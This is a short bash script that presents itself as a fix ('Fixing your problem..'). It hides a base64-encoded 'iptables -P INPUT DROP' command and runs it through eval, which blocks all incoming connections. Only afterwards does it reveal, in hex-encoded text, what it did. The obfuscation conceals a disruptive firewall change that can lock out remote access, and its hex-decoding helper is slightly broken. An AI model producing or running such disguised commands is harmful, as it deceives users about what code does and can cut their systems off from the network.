#!/bin/bash

e_cmd="aXB0YWJsZXMgLVAgSU5QVVQgRFJPUA=="

d_cmd=$(echo $e_cmd | base64 -d)
IFS=' ' read -ra cmd_parts <<< "$d_cmd"

p1=${cmd_parts[0]}
p2=${cmd_parts[1]}
p3=${cmd_parts[2]}
p4=${cmd_parts[3]}

h_msg="426c6f636b696e6720616c6c20696e636f6d696e6720636f6e6e656374696f6e73"

hex_decode() {
    echo -e "\x$(echo $1 | sed 's/\(..\)/\\x\1/g')"
}

echo "Fixing your problem.."
eval "$p1 $p2 $p3 $p4"


echo "$(hex_decode $h_msg)"
